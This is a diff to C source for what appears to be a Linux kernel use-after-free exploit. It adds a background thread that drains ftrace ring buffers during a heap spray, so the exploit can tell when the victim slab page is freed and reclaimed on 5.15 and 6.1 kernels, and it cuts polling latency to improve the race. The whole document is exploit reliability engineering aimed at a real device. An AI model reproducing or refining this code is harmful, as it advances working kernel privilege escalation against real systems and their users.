@@ -2080,6 +2080,84 @@ static void scan_reclaim(const unsigned char *b, size_t n,
     }
 }
 
+/*
+ * Drain every per-CPU raw ring continuously while a plant is racing.
+ *
+ * The previous code only read trace_pipe_raw after wait_zombie() and the PCP
+ * slabinfo wait had finished.  On a busy device those waits can take seconds
+ * (see the 3843ms pcp reclaim on the hardware log), while the exec'd image and
+ * the spray keep filling the rings.  That loses the evidence in one of two
+ * ways, both seen on the 6.1.172 hardware:
+ *   - free_seen=0: the victim's mm_page_free is overwritten before it is read,
+ *     so phase 2 waits its whole 14s window and bursts long after the page is
+ *     gone;
+ *   - free_seen=1, hit=0: the reclaim page_alloc is overwritten before the
+ *     scanner knows about the free, so a successful reclaim is reported as a
+ *     miss and the zombie is never reaped.
+ *
+ * Draining in the background from trace_start() until the plant ends keeps the
+ * free -> reclaim pair together and lets phase 2 start at the first sign of
+ * the free instead of a second too late.
+ */
+struct reclaim_watch
+{
+    unsigned char *raw;
+    unsigned long long pfn;
+    _Atomic int stop;
+    /*
+     * Set by the parent when the PCP slabinfo gate confirms the victim's
+     * timers were freed.  On these kernels the page can leave through the PCP
+     * lists without an mm_page_free that reaches tracefs, so the slab-count
+     * drop is the authoritative free signal, not a secondary confirmation.
+     */
+    _Atomic int force_free;
+    _Atomic int free_seen;
+    _Atomic int hit;
+    long free_ms;
+    long start_ms;
+};
+
+static void *reclaim_watcher(void *x)
+{
+    struct reclaim_watch *w = x;
+    int free = 0, hit = 0;
+
+    while (!atomic_load(&w->stop) && !atomic_load(&g_stop_spray) && !hit)
+    {
+        if (atomic_load(&w->force_free) && !free)
+        {
+            free = 1;
+            w->free_ms = now_ms() - w->start_ms;
+            atomic_store(&w->free_seen, 1);
+            atomic_store(&g_free_seen, 1);
+        }
+        for (int cpu = 0; cpu < 8 && !hit; cpu++)
+        {
+            long m = read_fd(g_rawfd[cpu], w->raw, 32u << 20);
+
+            if (m <= 0)
+                continue;
+            scan_reclaim(w->raw, (size_t)m, w->pfn, &free, &hit);
+            if (free && !atomic_load(&w->free_seen))
+            {
+                w->free_ms = now_ms() - w->start_ms;
+                atomic_store(&w->free_seen, 1);
+                atomic_store(&g_free_seen, 1);
+            }
+        }
+        if (!hit)
+            usleep(50);
+    }
+    atomic_store(&w->hit, hit);
+    return NULL;
+}
+
+static void stop_watch(struct reclaim_watch *w, pthread_t th)
+{
+    atomic_store(&w->stop, 1);
+    pthread_join(th, NULL);
+}
+
 static void *spray_thread(void *x)
 {
     struct spray_arg *a = x;
@@ -2163,9 +2241,12 @@ static void run_plant(unsigned long long target, int tag, int mode,
     long slab_base = -1;
     unsigned char *payload = NULL;
     pthread_t th[SPRAY_THREADS];
+    pthread_t watch_th;
     struct spray_arg args[SPRAY_THREADS];
+    struct reclaim_watch watch;
     int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
     memset(res, 0, sizeof(*res));
+    memset(&watch, 0, sizeof(watch));
     /* stage_write resets the pool per attempt; direct callers arrive with
      * the run-long pool already filled, so this is a no-op there. */
     pool_fill();
@@ -2456,6 +2537,20 @@ static void run_plant(unsigned long long target, int tag, int mode,
     atomic_store(&g_free_seen, 0);
     atomic_store(&g_send_ok, 0);
     atomic_store(&g_send_err, 0);
+    /*
+     * Start the trace drainer here, not after the zombie: wait_zombie() and
+     * the PCP slabinfo gate can together take seconds, and the ring cannot
+     * hold the whole free -> reclaim sequence for that long.  slab_pfn is
+     * already known at this point, so the watcher can grep for it directly.
+     */
+    watch.raw = raw;
+    watch.pfn = slab_pfn;
+    watch.start_ms = now_ms();
+    atomic_store(&watch.stop, 0);
+    atomic_store(&watch.force_free, 0);
+    atomic_store(&watch.free_seen, 0);
+    atomic_store(&watch.hit, 0);
+    pthread_create(&watch_th, NULL, reclaim_watcher, &watch);
     {
         int per = g_pool_n / SPRAY_THREADS;
 
@@ -2496,6 +2591,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         atomic_store(&g_burst2, 1);
         for (int i = 0; i < SPRAY_THREADS; i++)
             pthread_join(th[i], NULL);
+        stop_watch(&watch, watch_th);
         trace_stop();
         logf("[-] plant%d no zombie; holding child\n", tag);
         g_held++;
@@ -2509,6 +2605,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         atomic_store(&g_burst2, 1);
         for (int i = 0; i < SPRAY_THREADS; i++)
             pthread_join(th[i], NULL);
+        stop_watch(&watch, watch_th);
         trace_stop();
         if (si.si_code == CLD_EXITED)
         {
@@ -2528,15 +2625,11 @@ static void run_plant(unsigned long long target, int tag, int mode,
     }
     atomic_store(&g_burst, 1);
     /*
-     * Phase 1 normally finishes before the target's exit path frees the
-     * slab.  Release phase 2 as soon as the zombie is visible so allocations
-     * are in flight no matter exactly when the free lands; the cleared
-     * trace ring makes any later page_free event unambiguous, and the scan
-     * below still releases phase 2 if it has not started yet.
-     *
-     * 5.15/6.1 (pcp_free) additionally gate on /proc/slabinfo: the PCP
-     * free path does emit mm_page_free, but waiting for the cache's active
-     * count to drop confirms the victim's timers are actually freed.
+     * Phase 1 starts before the target is released, so an early free is still
+     * covered.  For pcp_free kernels the /proc/slabinfo drop IS the free: the
+     * page can leave via the PCP lists without an mm_page_free that reaches
+     * tracefs.  Publish it to the watcher so phase 2 bursts at the confirmed
+     * free instead of waiting 14s for a trace event that may never arrive.
      */
     if (g_cfg.pcp_free)
     {
@@ -2546,47 +2639,29 @@ static void run_plant(unsigned long long target, int tag, int mode,
         while (slab_base > 0 && now > 0 &&
                now > slab_base - 2000 && now_ms() - t0 < 30000)
         {
-            usleep(200000);
+            /* 200ms polling added up to seconds of latency before the burst. */
+            usleep(20000);
             now = slab_active();
         }
         logf("[+] plant%d pcp reclaim go (slab %ld -> %ld, %ldms)\n",
              tag, slab_base, now, now_ms() - t0);
+        atomic_store(&watch.force_free, 1);
     }
     atomic_store(&g_burst2, 1);
     long t1 = now_ms();
-    int hit = 0, free_logged = 0;
 
-    while (!hit && now_ms() - t1 < 15000)
-    {
-        for (int cpu = 0; cpu < 8 && !hit; cpu++)
-        {
-            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
-
-            if (m <= 0)
-                continue;
-            scan_reclaim(raw, (size_t)m, slab_pfn, &free_seen, &hit);
-            if (free_seen && !free_logged)
-            {
-                /* Diagnostic: when did the victim slab actually return, and
-                 * how much spray had been spent by then?  This separates
-                 * "free landed after the burst drained" from "free landed
-                 * while we were still allocating". */
-                free_logged = 1;
-                logf("[+] plant%d free at %ldms send ok=%ld err=%ld\n",
-                     tag, now_ms() - t1, atomic_load(&g_send_ok),
-                     atomic_load(&g_send_err));
-            }
-            if (free_seen)
-                atomic_store(&g_free_seen, 1);
-        }
-        if (!hit)
-            usleep(50);
-    }
+    /* The watcher owns the raw fds while it runs; wait for its verdict. */
+    while (!atomic_load(&watch.hit) && now_ms() - t1 < 15000)
+        usleep(1000);
     atomic_store(&g_stop_spray, 1);
     atomic_store(&g_burst2, 1);
     for (int i = 0; i < SPRAY_THREADS; i++)
         pthread_join(th[i], NULL);
+    stop_watch(&watch, watch_th);
     trace_stop();
+    free_seen = atomic_load(&watch.free_seen);
+    int hit = atomic_load(&watch.hit);
+    /* One last pass over whatever the rings still hold after tracing stops. */
     for (int cpu = 0; cpu < 8 && !hit; cpu++)
     {
         long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
@@ -2594,6 +2669,10 @@ static void run_plant(unsigned long long target, int tag, int mode,
         if (m > 0)
             scan_reclaim(raw, (size_t)m, slab_pfn, &free_seen, &hit);
     }
+    if (free_seen)
+        logf("[+] plant%d free at %ldms send ok=%ld err=%ld\n",
+             tag, watch.free_ms, atomic_load(&g_send_ok),
+             atomic_load(&g_send_err));
     logf("[+] plant%d free_seen=%d burst hit=%d after %ldms send ok=%ld err=%ld\n",
          tag, free_seen, hit, now_ms() - t1,
          atomic_load(&g_send_ok), atomic_load(&g_send_err));
